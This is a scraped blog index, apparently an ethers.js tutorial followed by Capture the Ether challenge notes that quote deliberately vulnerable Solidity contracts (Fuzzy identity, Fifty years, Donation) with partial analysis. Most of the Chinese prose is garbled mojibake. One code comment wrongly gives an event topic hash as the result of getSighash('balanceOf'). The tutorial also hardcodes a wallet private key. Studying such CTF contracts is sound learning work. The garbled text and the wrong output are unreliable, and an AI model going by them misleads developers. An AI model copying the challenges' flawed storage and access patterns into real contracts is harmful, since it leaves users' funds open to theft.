è°ƒç”¨åˆçº¦çš„å‡½æ•° */let slot0 = await constract.getSlot0();console.log(`slot0&#x27;s value is =&gt; $&#123;slot0&#125;`);let slot1 = await constract.getSlot1();console.log(`slot1&#x27;s value is =&gt; $&#123;slot1&#125;`);let slot2 = await constract.getSlot2();console.log(`slot2&#x27;s value is =&gt; $&#123;slot2&#125;`); let balance = await constract.balanceOf(&quot;0x643bB521371F66E271937C6365F5812118e58a6D&quot;);console.log(`ETH balance is =&gt; $&#123;balance&#125;`); æ‰§è¡Œç»“æœï¼š å®Œæ•´çš„ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041import &#123; ethers &#125; from &quot;ethers&quot;;import fs from &quot;fs&quot;;// è·å–æœ¬åœ°çš„providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// æ ¹æ®ç§é’¥åˆ›å»º walletå¯¹è±¡const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet = new ethers.Wallet(privateKey, provider);// è¯»å–æ–‡ä»¶çš„abiconst ABI = JSON.parse(fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo2.abi&quot;).toString());// è¯»å–æ–‡ä»¶çš„bytecodeconst byteCode = fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo2.code&quot;).toString();// åˆ›å»ºåˆçº¦å·¥å‚ ContractFactory å®ä¾‹const factoryDemo2 = new ethers.ContractFactory(ABI, byteCode, wallet);// åˆ©ç”¨ factoryDemo2 éƒ¨ç½²demo2 åˆçº¦const gasPrice = await provider.getGasPrice();const transaction = &#123; value: ethers.utils.parseEther(&#x27;1&#x27;), gasPrice &#125;;const constract = await factoryDemo2.deploy(9,&quot;0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C&quot;,&quot;biyou&quot;,transaction);console.log(`éƒ¨ç½²å¾—åˆ°çš„åˆçº¦åœ°å€ï¼š$&#123;constract.address&#125;`);console.log(&quot;éƒ¨ç½²åˆçº¦çš„äº¤æ˜“è¯¦æƒ…&quot;);console.log(constract.deployTransaction);/** * è°ƒç”¨åˆçº¦çš„å‡½æ•° */let slot0 = await constract.getSlot0();console.log(`slot0&#x27;s value is =&gt; $&#123;slot0&#125;`);let slot1 = await constract.getSlot1();console.log(`slot1&#x27;s value is =&gt; $&#123;slot1&#125;`);let slot2 = await constract.getSlot2();console.log(`slot2&#x27;s value is =&gt; $&#123;slot2&#125;`);let balance = await constract.balanceOf(&quot;0x643bB521371F66E271937C6365F5812118e58a6D&quot;);console.log(`ETH balance is =&gt; $&#123;balance&#125;`); 8.æ£€ç´¢äº‹ä»¶ â€” å¾ˆæœ‰ç”¨8.1 å‚è€ƒåšå®¢ï¼šè¯·ç§»æ­¥ è¿™é‡Œ8.2 æ£€ç´¢äº‹ä»¶ å¯ä»¥åˆ©ç”¨Ethersä¸­åˆçº¦ç±»å‹çš„queryFilter()å‡½æ•°è¯»å–åˆçº¦é‡Šæ”¾çš„äº‹ä»¶ 1const transferEvents = await contract.queryFilter(&#x27;äº‹ä»¶å&#x27;,èµ·å§‹åŒºå—ï¼Œç»“æŸåŒºå—) queryFilter() åŒ…å«3ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯äº‹ä»¶åï¼ˆå¿…å¡«ï¼‰ï¼Œèµ·å§‹åŒºå—ï¼ˆé€‰å¡«ï¼‰ï¼Œå’Œç»“æŸåŒºå—ï¼ˆé€‰å¡«ï¼‰ã€‚æ£€ç´¢ç»“æœä¼šä»¥æ•°ç»„çš„å½¢å¼è¿”å›ã€‚ æ³¨ï¼šè¦æ£€ç´¢çš„äº‹ä»¶å¿…é¡»åŒ…å«åœ¨åˆçº¦çš„abiä¸­ã€‚ 9. ç›‘å¬åˆçº¦äº‹ä»¶9.1 ç›‘å¬åˆçº¦äº‹ä»¶ contract.on åœ¨ethersjsä¸­ï¼Œåˆçº¦å¯¹è±¡æœ‰ä¸€ä¸ªcontract.on çš„ç›‘å¬æ–¹æ³•ï¼Œè®©æˆ‘ä»¬æŒç»­ç›‘å¬åˆçº¦çš„äº‹ä»¶ï¼š 1contract.on(&quot;eventName&quot;, function) contract.on æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯è¦ç›‘å¬çš„äº‹ä»¶åç§°â€eventNameâ€ï¼Œéœ€è¦åŒ…å«åˆçº¦abiä¸­ï¼›å¦ä¸€ä¸ªæ˜¯æˆ‘ä»¬åœ¨äº‹ä»¶å‘ç”Ÿæ—¶è°ƒç”¨çš„å‡½æ•° contract.once åˆçº¦å¯¹è±¡æœ‰ä¸€ä¸ªcontract.onceçš„ç›‘å¬æ–¹æ³•ï¼Œè®©æˆ‘ä»¬åªç›‘å¬ä¸€æ¬¡åˆçº¦é‡Šæ”¾äº‹ä»¶ï¼Œå®ƒçš„å‚æ•°ä¸contract.onä¸€æ ·ï¼š 1contract.once(&quot;eventName&quot;,function) 9.2 ç›‘å¬åˆçº¦ç¤ºä¾‹åœ¨è¿™é‡Œ â€”-&gt; here â€¦â€¦â€¦â€¦â€¦â€¦â€¦ 10. äº‹ä»¶è¿‡æ»¤ç°é˜¶æ®µçš„æˆ‘è¿˜ä¸é€‚åˆè€ƒè™‘è¿™äº›ï¼Œæ—¥åå†å­¦ åšå®¢é“¾æ¥ â€¦â€¦â€¦â€¦â€¦â€¦â€¦ 11. BigNumber å’Œ å•ä½è½¬æ¢11.1 BigNumber åœ¨ä»¥å¤ªåŠä¸­ï¼Œè®¸å¤šè®¡ç®—éƒ½å¯¹JavaScriptæ•´æ•°çš„å®‰å…¨å€¼ï¼ˆjsä¸­æœ€å¤§å®‰å…¨æ•°ä¸º9007199254740991ï¼‰ã€‚å› æ­¤ï¼Œethers.jsä½¿ç”¨BigNumber ç±»å®‰å…¨åœ°å¯¹ä»»ä½•æ•°é‡çº§çš„æ•°å­—è¿›è¡Œæ•°å­¦è¿ç®—ã€‚åœ¨ethers.jsä¸­ï¼Œå¤§å¤šæ•°éœ€è¦è¿”å›å€¼çš„æ“ä½œå°†è¿”å›BigNumberï¼Œè€Œæ¥å—å€¼çš„å‚æ•°ä¹Ÿä¼šæ¥å—ä»–ä»¬ã€‚ BigNumberå®˜æ–¹æ–‡æ¡£ 11.2 åˆ›å»ºBigNumberå®ä¾‹ å¯ä»¥åˆ©ç”¨ ethers.BigNumber.from() å‡½æ•°å°†stringï¼Œnumberï¼ŒBigNumberç­‰ç±»å‹è½¬æ¢ä¸ºBigNumberã€‚ æ³¨ï¼šè¶…è¿‡jsæœ€å¤§å®‰å…¨æ•´æ•°çš„æ•°å€¼å°†ä¸èƒ½è½¬æ¢ 1234567const oneGwei = ethers.BigNumber.from(&quot;1000000000&quot;); // ä»åè¿›åˆ¶å­—ç¬¦ä¸²ç”Ÿæˆconsole.log(oneGwei)console.log(ethers.BigNumber.from(&quot;0x3b9aca00&quot;)) // ä»hexå­—ç¬¦ä¸²ç”Ÿæˆconsole.log(ethers.BigNumber.from(1000000000)) // ä»æ•°å­—ç”Ÿæˆ// ä¸èƒ½ä»jsæœ€å¤§çš„å®‰å…¨æ•´æ•°ä¹‹å¤–çš„æ•°å­—ç”ŸæˆBigNumberï¼Œä¸‹é¢ä»£ç ä¼šæŠ¥é”™// ethers.BigNumber.from(Number.MAX_SAFE_INTEGER);console.log(&quot;jsä¸­æœ€å¤§å®‰å…¨æ•´æ•°ï¼š&quot;, Number.MAX_SAFE_INTEGER) è¿è¡Œç»“æœï¼š 11.3 BigNumberè¿ç®— BigNumberæ”¯æŒå¾ˆå¤šè¿ç®—ï¼Œä¾‹å¦‚åŠ å‡ä¹˜é™¤ã€å–æ¨¡modï¼Œå¹‚è¿ç®—powï¼Œç»å¯¹å€¼absç­‰è¿ç®—ï¼š 1234567// è¿ç®—console.log(&quot;åŠ æ³•ï¼š&quot;, oneGwei.add(1).toString())console.log(&quot;å‡æ³•ï¼š&quot;, oneGwei.sub(1).toString())console.log(&quot;ä¹˜æ³•ï¼š&quot;, oneGwei.mul(2).toString())console.log(&quot;é™¤æ³•ï¼š&quot;, oneGwei.div(2).toString())// æ¯”è¾ƒconsole.log(&quot;æ˜¯å¦ç›¸ç­‰ï¼š&quot;, oneGwei.eq(&quot;1000000000&quot;)) è¿è¡Œç»“æœï¼š 11. 4 å•ä½è½¬æ¢ ä»¥å¤ªåŠä¸­ï¼Œ1 ethers ç­‰äº 10^18weiã€‚ä¸‹é¢æ˜¯ä¸€äº›å¸¸ç”¨çš„å•ä½ï¼š åœ¨åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸å°†æ•°å€¼åœ¨ç”¨æˆ·å¯è¯»çš„å­—ç¬¦ä¸²ï¼ˆä»¥etherä¸ºå•ä½ï¼‰å’Œæœºå™¨å¯è¯»çš„æ•°å€¼ï¼ˆä»¥weiä¸ºå•ä½ï¼‰ä¹‹é—´è½¬æ¢ã€‚ä¾‹å¦‚ï¼Œé’±åŒ…å¯ä»¥ä¸ºç”¨æˆ·ç•Œé¢æŒ‡å®šä½™é¢ï¼ˆä»¥etherä¸ºå•ä½ï¼‰å’Œgasä»·æ ¼ï¼ˆä»¥gweiä¸ºå•ä½ï¼‰ï¼Œä½†æ˜¯åœ¨å‘é€äº¤æ˜“æ—¶ï¼Œä¸¤è€…éƒ½å¿…é¡»è½¬æ¢æˆä»¥weiä¸ºå•ä½çš„æ•°å€¼ã€‚ethers.jsæä¾›äº†ä¸€äº›åŠŸèƒ½å‡½æ•°ï¼Œæ–¹ä¾¿è¿™ç±»è½¬æ¢ã€‚ formatUnits(å˜é‡, å•ä½)ï¼šæ ¼å¼åŒ–ï¼Œå°å•ä½è½¬å¤§å•ä½ï¼Œæ¯”å¦‚wei -&gt; etherï¼Œåœ¨æ˜¾ç¤ºä½™é¢æ—¶å¾ˆæœ‰ç”¨ã€‚å‚æ•°ä¸­ï¼Œå•ä½å¡«ä½æ•°ï¼ˆæ•°å­—ï¼‰æˆ–æŒ‡å®šçš„å•ä½ï¼ˆå­—ç¬¦ä¸²ï¼‰ã€‚ 123456789101112131415//ä»£ç å‚è€ƒï¼šhttps://docs.ethers.io/v5/api/utils/display-logic/#utils-parseUnitsconsole.group(&#x27;\\n2. æ ¼å¼åŒ–ï¼šå°å•ä½è½¬å¤§å•ä½ï¼ŒformatUnits&#x27;);console.log(ethers.utils.formatUnits(oneGwei, 0));// &#x27;1000000000&#x27;console.log(ethers.utils.formatUnits(oneGwei, &quot;gwei&quot;));// &#x27;1.0&#x27;console.log(ethers.utils.formatUnits(oneGwei, 9));// &#x27;1.0&#x27;console.log(ethers.utils.formatUnits(oneGwei, &quot;ether&quot;));// `0.000000001`console.log(ethers.utils.formatUnits(1000000000, &quot;gwei&quot;));// &#x27;1.0&#x27;console.log(ethers.utils.formatEther(oneGwei));// `0.000000001` ç­‰åŒäºformatUnits(value, &quot;ether&quot;)console.groupEnd(); è¿è¡Œç»“æœï¼š parseUnitsï¼šè§£æï¼Œå¤§å•ä½è½¬å°å•ä½ï¼Œæ¯”å¦‚ether -&gt; weiï¼Œåœ¨å°†ç”¨æˆ·è¾“å…¥çš„å€¼è½¬ä¸ºweiä¸ºå•ä½çš„æ•°å€¼å¾ˆæœ‰ç”¨ã€‚å‚æ•°ä¸­ï¼Œå•ä½å¡«ä½æ•°ï¼ˆæ•°å­—ï¼‰æˆ–æŒ‡å®šçš„å•ä½ï¼ˆå­—ç¬¦ä¸²ï¼‰ã€‚ 1234567891011121314151617// 3. è§£æï¼šå¤§å•ä½è½¬å°å•ä½// ä¾‹å¦‚å°†etherè½¬æ¢ä¸ºweiï¼šparseUnits(å˜é‡, å•ä½),parseUnitsé»˜è®¤å•ä½æ˜¯ ether// ä»£ç å‚è€ƒï¼šhttps://docs.ethers.io/v5/api/utils/display-logic/#utils-parseUnitsconsole.group(&#x27;\\n3. è§£æï¼šå¤§å•ä½è½¬å°å•ä½ï¼ŒparseUnits&#x27;);console.log(ethers.utils.parseUnits(&quot;1.0&quot;).toString());// &#123; BigNumber: &quot;1000000000000000000&quot; &#125;console.log(ethers.utils.parseUnits(&quot;1.0&quot;, &quot;ether&quot;).toString());// &#123; BigNumber: &quot;1000000000000000000&quot; &#125;console.log(ethers.utils.parseUnits(&quot;1.0&quot;, 18).toString());// &#123; BigNumber: &quot;1000000000000000000&quot; &#125;console.log(ethers.utils.parseUnits(&quot;1.0&quot;, &quot;gwei&quot;).toString());// &#123; BigNumber: &quot;1000000000&quot; &#125;console.log(ethers.utils.parseUnits(&quot;1.0&quot;, 9).toString());// &#123; BigNumber: &quot;1000000000&quot; &#125;console.log(ethers.utils.parseEther(&quot;1.0&quot;).toString());// &#123; BigNumber: &quot;1000000000000000000&quot; &#125; ç­‰åŒäºparseUnits(value, &quot;ether&quot;)console.groupEnd(); è¿è¡Œç»“æœï¼š 12. CallStaticcallStaticæ–¹æ³•æ˜¯å±äºethers.Contractç±»çš„ç¼–å†™æ–¹æ³•åˆ†æï¼ŒåŒç±»çš„è¿˜æœ‰populateTransactionå’ŒestimateGasæ–¹æ³• 12.1 å¯èƒ½å¤±è´¥çš„äº¤æ˜“ åœ¨ä»¥å¤ªåŠä¸Šäº¤æ˜“éœ€è¦æ”¯ä»˜æ˜‚è´µçš„gasï¼Œå¹¶ä¸”æœ‰å¤±è´¥çš„é£é™©ï¼Œå‘é€å¤±è´¥çš„äº¤æ˜“å¹¶ä¸ä¼šæŠŠgasè¿”è¿˜ç»™ä½ ã€‚å› æ­¤ï¼Œåœ¨å‘é€äº¤æ˜“å‰çŸ¥é“å“ªäº›äº¤æ˜“å¯èƒ½ä¼šå¤±è´¥éå¸¸é‡è¦ã€‚ä»¥å°ç‹ç‹¸é’±åŒ…ï¼ˆmetamaskï¼‰ä¸ºä¾‹ã€‚ å¦‚æœäº¤æ˜“å°†å¤±è´¥ï¼Œå°ç‹ç‹¸ä¼šå‘Šè¯‰ä½  this transaction may failï¼Œç¿»è¯‘è¿‡æ¥å°±æ˜¯â€è¿™ç¬”äº¤æ˜“å¯èƒ½ä¼šå¤±è´¥â€ã€‚å½“ç”¨æˆ·çœ‹åˆ°æç¤ºçš„æ—¶å€™ï¼Œå°±å¯ä»¥å–æ¶ˆäº¤æ˜“äº†ã€‚ å®ç°çš„åŸç†ï¼šä»¥å¤ªåŠèŠ‚ç‚¹æœ‰ä¸€ä¸ªeth_callæ–¹æ³•ï¼Œè®©ç”¨æˆ·å¯ä»¥æ¨¡æ‹Ÿä¸€ç¬”äº¤æ˜“ï¼Œå¹¶è¿”å›å¯èƒ½çš„äº¤æ˜“ç»“æœï¼Œä½†ä¸æ˜¯çœŸæ­£çš„åœ¨åŒºå—é“¾ä¸Šæ‰§è¡Œï¼ˆäº¤æ˜“ä¸ä¸Šé“¾ï¼‰ã€‚ 12.2 callStatic åœ¨ethers.jsä¸­ä½ å¯ä»¥åˆ©ç”¨contractå¯¹è±¡çš„callStatic()æ¥è°ƒç”¨ä»¥å¤ªåŠèŠ‚ç‚¹çš„eth_callã€‚å¦‚æœè°ƒç”¨æˆåŠŸï¼Œåˆ™è¿”å›tureï¼›å¦‚æœå¤±è´¥ï¼Œåˆ™æŠ¥é”™å¹¶è¿”å›å¤±è´¥åŸå› ã€‚æ–¹æ³•ï¼š 12const tx = await contract.callStatic.å‡½æ•°å( å‚æ•°, &#123;override&#125;)console.log(`äº¤æ˜“ä¼šæˆåŠŸå—ï¼Ÿï¼š`, tx) å‡½æ•°åï¼šä¸ºæ¨¡æ‹Ÿè°ƒç”¨çš„å‡½æ•°åã€‚ å‚æ•°ï¼šè°ƒç”¨å‡½æ•°çš„å‚æ•°ã€‚ {override}ï¼šé€‰å¡«ï¼Œå¯åŒ…å«ä¸€ä¸‹å‚æ•°ï¼š fromï¼šæ‰§è¡Œæ—¶çš„msg.senderï¼Œä¹Ÿå°±æ˜¯ä½ å¯ä»¥æ¨¡æ‹Ÿä»»ä½•ä¸€ä¸ªäººçš„è°ƒç”¨ï¼Œæ¯”å¦‚Vç¥ã€‚ valueï¼šæ‰§è¡Œæ—¶çš„msg.valueã€‚ blockTagï¼šæ‰§è¡Œæ—¶çš„åŒºå—é«˜åº¦ã€‚ gasPrice gasLimit nonce 12.3 ç”¨callStatic æ¨¡æ‹ŸDAIè½¬è´¦æ¼”ç¤ºè¿‡ç¨‹â€”-ã€‹åšå®¢ 13. ç¼–ç  calldata13.1 æ¥å£ç±»Interface ethers.js çš„æ¥å£ç±»æŠ½è±¡äº†ä¸ä»¥å¤ªåŠç½‘ç»œçš„åˆçº¦äº¤äº’æ‰€éœ€çš„ABIç¼–ç å’Œè§£ç ã€‚ABIä¸APIç±»ä¼¼ï¼Œæ˜¯ä¸€æ ¼å¼ï¼Œç”¨äºå¯¹åˆçº¦å¯ä»¥å¤„ç†çš„å„ç§ç±»å‹çš„æ•°æ®è¿›è¡Œç¼–ç ï¼Œä»¥ä¾¿å®ƒä»¬å¯ä»¥äº¤äº’ã€‚ å¯ä»¥åˆ©ç”¨abiç”Ÿæˆæˆ–è€…ç›´æ¥ä»åˆçº¦ä¸­è·å–interfaceå˜é‡ï¼š 1234// åˆ©ç”¨abiç”Ÿæˆconst interface = new ethers.utils.Interface(abi)// ç›´æ¥ä»contractä¸­è·å–const interface2 = contract.interface æ¥å£ç±»å°è£…äº†ä¸€äº›ç¼–ç è§£ç çš„æ–¹æ³•ã€‚ä¸ä¸€äº›ç‰¹æ®Šçš„åˆçº¦äº¤äº’æ—¶ï¼ˆæ¯”å¦‚ä»£ç† åˆçº¦ï¼‰ï¼Œä½ éœ€è¦ç¼–ç å‚æ•°ã€è§£ç è¿”å›å€¼ï¼š æ³¨ï¼šç›¸å…³å‡½æ•°å¿…é¡»åŒ…å«åœ¨abiä¸­ã€‚ getSighash():è·å–å‡½æ•°é€‰æ‹©å™¨ï¼ˆfunction selectorï¼‰ï¼Œå‚æ•°ä¸ºå‡½æ•°åæˆ–å‡½æ•°ç­¾åã€‚ è‡³äºå‡½æ•°ç­¾åå¦‚ä½•è·å–ï¼Œåœ¨remixä¸Šä½¿ç”¨keccak256()æˆ–çš„å’Œethersjsä½¿ç”¨keccak256()è·å–çš„ç»“æœå®Œå…¨ä¸ä¸€æ ·ï¼Œæ—¥åç©ºé—²äº†å†ä»”ç»†æ·±å…¥å­¦ä¹  12interface.getSighash(&quot;balanceOf&quot;);// &#x27;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#x27; encodeDeploy()ï¼šç¼–ç æ„é€ å™¨çš„å‚æ•°ï¼Œç„¶åå¯ä»¥é™„åœ¨åˆçº¦å­—èŠ‚ç çš„åé¢ã€‚ 1interface.encodeDeploy(&quot;Wrapped ETH&quot;, &quot;WETH&quot;); encodeFunctionData()ï¼šç¼–ç å‡½æ•°çš„calldataã€‚ 1interface.encodeFunctionData(&quot;balanceOf&quot;, [&quot;0xc778417e063141139fce010982780140aa0cd5ab&quot;]); decodeFunctionResult()ï¼šè§£ç å‡½æ•°çš„è¿”å›å€¼ã€‚ 1interface.decodeFunctionResult(&quot;balanceOf&quot;, resultData)","categories":[{"name":"Ethers.js","slug":"Ethers-js","permalink":"https://biyouqiuqiu.com/categories/Ethers-js/"},{"name":"Basic_Knowledge","slug":"Ethers-js/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Ethers-js/Basic-Knowledge/"}],"tags":[{"name":"ethers.js","slug":"ethers-js","permalink":"https://biyouqiuqiu.com/tags/ethers-js/"}]},{"title":"Public Key","slug":"Smart contracts/capther the ether/Public Key","date":"2023-04-24T07:50:10.000Z","updated":"2023-04-24T07:50:10.000Z","comments":true,"path":"2023/04/24/Smart contracts/capther the ether/Public Key/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/24/Smart%20contracts/capther%20the%20ether/Public%20Key/","excerpt":"","text":"Public Key1. é¢˜ç›®2. åˆ†æ3. è§£é¢˜","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Fuzzy identity","slug":"Smart contracts/capther the ether/Fuzzy identity","date":"2023-04-17T02:50:10.000Z","updated":"2023-04-17T02:50:10.000Z","comments":true,"path":"2023/04/17/Smart contracts/capther the ether/Fuzzy identity/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/17/Smart%20contracts/capther%20the%20ether/Fuzzy%20identity/","excerpt":"","text":"Fuzzy identity1. é¢˜ç›® 1.1 This contract can only be used by me (smarx). I donâ€™t trust myself to remember my private key, so Iâ€™ve made it so whatever address Iâ€™m using in the future will work: I always use a wallet contract that returns â€œsmarxâ€ if you ask its name. Everything I write has bad code in it, so my address always includes the hex string badc0de. To complete this challenge, steal my identity! 1.2 æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.21;interface IName &#123; function name() external view returns (bytes32);&#125;contract FuzzyIdentityChallenge &#123; bool public isComplete; function authenticate() public &#123; require(isSmarx(msg.sender)); require(isBadCode(msg.sender)); isComplete = true; &#125; function isSmarx(address addr) internal view returns (bool) &#123; return IName(addr).name() == bytes32(&quot;smarx&quot;); &#125; function isBadCode(address _addr) internal pure returns (bool) &#123; bytes20 addr = bytes20(_addr); bytes20 id = hex&quot;000000000000000000000000000000000badc0de&quot;; bytes20 mask = hex&quot;000000000000000000000000000000000fffffff&quot;; for (uint256 i = 0; i &lt; 34; i++) &#123; if (addr &amp; mask == id) &#123; return true; &#125; mask &lt;&lt;= 4; id &lt;&lt;= 4; &#125; return false; &#125;&#125; 2. åˆ†æ 2.1 åˆ†æä»£ç å¯çŸ¥ï¼Œè¦æ˜¯ isCompleteçš„å€¼ä¸º true éœ€è¦æˆåŠŸè°ƒç”¨ authenticateå‡½æ•° 2.2 ä½†æ˜¯éœ€è¦é€šè¿‡ä¸¤å±‚æ ¡éªŒï¼Œç¬¬ä¸€å±‚ç®€å•ï¼Œç›´æ¥æŒ‰è¦æ±‚ç¼–å†™ä¸€ä¸ªåä¸ºnameçš„å‡½æ•°çš†å¯ï¼Œç¬¬äºŒä¸ªå‡½æ•°è¦æ±‚ä¼ å…¥çš„åœ°å€æ˜¯ä»¥ badc0de ç»“å°¾çš„ï¼Œæˆ‘åœ¨è¿™é‡Œæƒ³åˆ°äº†ä½¿ç”¨ create2 çš„æ–¹æ³•æ¥æ„é€ ä¸€ä¸ªä»¥ badc0deç»“å°¾çš„åœ°å€ï¼Œä½†æ˜¯æˆ‘æœ‰æƒ³æ³•æš‚æ—¶è¿˜ä¸èƒ½å®ç°ã€‚ã€‚ã€‚ã€‚çº ç»“ï¼šweb3.utils.soliditySha3(param1 [, param2, ...]) å’Œ web3.utils.sha3(string) çœ‹äº†ç½‘ä¸Šå¤§ä½¬ä½¿ç”¨create2è§£æ³•çš„æ›´è¿·æƒ‘äº† 3. è§£é¢˜","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Fifty years","slug":"Smart contracts/capther the ether/Fifty years","date":"2023-04-17T02:30:10.000Z","updated":"2023-04-17T02:30:10.000Z","comments":true,"path":"2023/04/17/Smart contracts/capther the ether/Fifty years/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/17/Smart%20contracts/capther%20the%20ether/Fifty%20years/","excerpt":"","text":"Fifty years1. é¢˜ç›® 1.1 This contract locks away ether. The initial ether is locked away until 50 years has passed, and subsequent contributions are locked until even later. All you have to do to complete this challenge is wait 50 years and withdraw the ether. If youâ€™re not that patient, youâ€™ll need to combine several techniques to hack this contract 1.2 æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374pragma solidity ^0.4.21;contract FiftyYearsChallenge &#123; // Contribution ç»“æ„ä½“ä¸­åŒ…å«äº† é‡‘é¢å’Œè§£é”æ—¶é—´ struct Contribution &#123; uint256 amount; uint256 unlockTimestamp; &#125; // Contribution ç±»å‹çš„æ•°ç»„ Contribution[] queue; uint256 head; address owner; function FiftyYearsChallenge(address player) public payable &#123; require(msg.value == 1 ether); // åˆå§‹åŒ–åˆçº¦æ‰€æœ‰è€…ä¸ºç©å®¶ï¼Œå¹¶æŠŠç©å®¶çš„é’±é”èµ·æ¥ï¼Œç›´åˆ°äº”åå¹´ä¹‹åæ‰å¯ä»¥è§£é” owner = player; queue.push(Contribution(msg.value, now + 50 years)); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function upsert(uint256 index, uint256 timestamp) public payable &#123; // æ ¡éªŒè°ƒç”¨è€…æ˜¯å¦ä¸ºåˆçº¦æ‰€æœ‰è€… require(msg.sender == owner); // if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123; // Update existing contribution amount without updating timestamp. // è¿™é‡Œstorage ä¿®é¥°çš„æ˜¯åˆ›å»ºçš„å¼•ç”¨ï¼Œä¿®æ”¹contribution çš„å€¼ä¹Ÿä¼šå½±å“åˆ° queue[index]çš„å€¼ Contribution storage contribution = queue[index]; // ç›²çŒœè¿™é‡Œæœ‰æ¼æ´ï¼Œè¦†ç›– contribution.amount += msg.value; &#125; else &#123; // Append a new contribution. Require that each contribution unlock // at least 1 day after the previous one. require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days); contribution.amount = msg.value; contribution.unlockTimestamp = timestamp; queue.push(contribution); &#125; &#125; function withdraw(uint256 index) public &#123; require(msg.sender == owner); // ç¡®ä¿ç°åœ¨çš„æ—¶é—´å¤§äºæˆ–ç­‰äºè§£é”æ—¶é—´ require(now &gt;= queue[index].unlockTimestamp); // Withdraw this and any earlier contributions. uint256 total = 0; for (uint256 i = head; i &lt;= index; i++) &#123; total += queue[i].amount; // Reclaim storage. delete queue[i]; &#125; // Move the head of the queue forward so we don&#x27;t have to loop over // already-withdrawn contributions. head = index + 1; msg.sender.transfer(total); &#125;&#125; 2. åˆ†æ3. è§£é¢˜","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Donation","slug":"Smart contracts/capther the ether/Donation","date":"2023-04-14T02:20:10.000Z","updated":"2023-04-14T02:20:10.000Z","comments":true,"path":"2023/04/14/Smart contracts/capther the ether/Donation/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/14/Smart%20contracts/capther%20the%20ether/Donation/","excerpt":"","text":"Donation1. é¢˜ç›® 1.1 A candidate you donâ€™t like is accepting campaign contributions via the smart contract below. To complete this challenge, steal the candidateâ€™s ether. 1.2 æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041pragma solidity ^0.4.21;contract DonationChallenge &#123; struct Donation &#123; uint256 timestamp; uint256 etherAmount; &#125; Donation[] public donations; address public owner; function DonationChallenge() public payable &#123; require(msg.value == 1 ether); owner = msg.sender; &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function donate(uint256 etherAmount) public payable &#123; // amount is in ether, but msg.value is in wei uint256 scale = 10**18 * 1 ether; require(msg.value == etherAmount / scale); Donation donation; donation.timestamp = now; donation.etherAmount = etherAmount; donations.push(donation); &#125; function withdraw() public &#123; require(msg.sender == owner); msg.sender.transfer(address(this).balance); &#125;&#125; 2.åˆ†æ 2.1 æœ¬é¢˜çš„é€šè¿‡è¦æ±‚å°±æ˜¯éœ€è¦æˆ‘ä»¬å°†åˆçº¦ä¸­çš„é’±å…¨éƒ¨å·èµ°ï¼Œåˆçº¦ä¸­èƒ½å¤Ÿè¿›è¡Œè½¬é’±æ“ä½œçš„åªæœ‰withdrawå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬åªæœ‰å°† require(msg.sender == owner) è¿™ä¸ªæ ¡éªŒé€šè¿‡æ‰å¯ä»¥å°†åˆçº¦ä¸­æ‰€æœ‰çš„é’±è½¬èµ° 2.2 åˆçº¦ä¸­æœ‰ç»“æ„ä½“ï¼Œè¿™ç‚¹éœ€è¦æ³¨æ„ï¼Œåˆ†ææºç å¯çŸ¥ slot0 çš„ä½ç½®å­˜å‚¨çš„æ˜¯ donationsï¼ˆé‡Œé¢å…·ä½“çš„å…ƒç´ çš„å­˜å‚¨ä½ç½®åœ¨å“ªï¼Œä¹‹å‰é‡åˆ°è¿‡ï¼Œæ¨èæ–‡çŒ®ï¼‰ï¼Œslot1 çš„ä½ç½®å­˜å‚¨çš„æ˜¯ ownerï¼›ä½†åœ¨å‡½æ•°donate ä¸­ 